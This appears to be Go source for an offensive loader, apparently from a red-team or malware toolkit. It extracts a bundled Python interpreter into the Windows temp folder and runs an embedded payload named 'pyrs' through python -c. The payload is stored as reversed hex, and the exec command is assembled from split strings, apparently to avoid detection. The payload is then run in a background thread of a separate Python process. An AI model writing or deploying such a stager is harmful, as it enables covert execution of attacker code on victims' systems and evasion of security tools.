//go:build py
// +build py

package main

import (
	"archive/zip"
	"bytes"
	_ "embed"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

//go:embed python.zip
var pybyte []byte

//go:embed bin/pyrs
var pyrs string

func ExtractToDir(dst string, zippedBytes []byte) {
	reader := bytes.NewReader(zippedBytes)
	//archive, err := zip.OpenReader("archive.zip")
	archive, err := zip.NewReader(reader, int64(len(zippedBytes)))
	if err != nil {
		panic(err)
	}
	//defer archive.Close()

	for _, f := range archive.File {
		filePath := filepath.Join(dst, f.Name)
		Info.Printf("unzipping file %s", filePath)

		if !strings.HasPrefix(filePath, filepath.Clean(dst)+string(os.PathSeparator)) {
			Error.Printf("invalid file path")
			return
		}
		if f.FileInfo().IsDir() {
			Info.Printf("creating directory...")
			os.MkdirAll(filePath, os.ModePerm)
			continue
		}

		if err := os.MkdirAll(filepath.Dir(filePath), os.ModePerm); err != nil {
			panic(err)
		}

		dstFile, err := os.OpenFile(filePath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
		if err != nil {
			panic(err)
		}

		fileInArchive, err := f.Open()
		if err != nil {
			panic(err)
		}

		if _, err := io.Copy(dstFile, fileInArchive); err != nil {
			panic(err)
		}

		dstFile.Close()
		fileInArchive.Close()
	}
}

func main() {
	pypath := os.TempDir() + "\\python\\"
	python := pypath + "python.exe"
	if !GardnerFileExist(python) {
		Info.Printf("[*] Adding python to : %s", pypath)
		ExtractToDir(pypath, pybyte)
	} else {
		Info.Printf("[*] Python already there : %s", pypath)
	}
	content := `import ` + `threading ` + `as t;`
	content += `t.Thread(target=` + `exec` + `,args=(` + `bytes.from` + `hex('` + pyrs + `'[::-1]` + `),)).start()`
	//fmt.Println(python, "-c", content)
	bin := []string{python, "-c", content}
	cmd := exec.Command(bin[0], bin[1:]...)
	Info.Printf("[*] Starting child process")
	if err := cmd.Start(); err != nil {
		Critical.Printf("Error: %v", err)
	}
	Info.Printf("[*] Waiting for child process to detach (Pid %d)", cmd.Process.Pid)
	cmd.Wait()
	Info.Printf("[*] Detached child process")
}
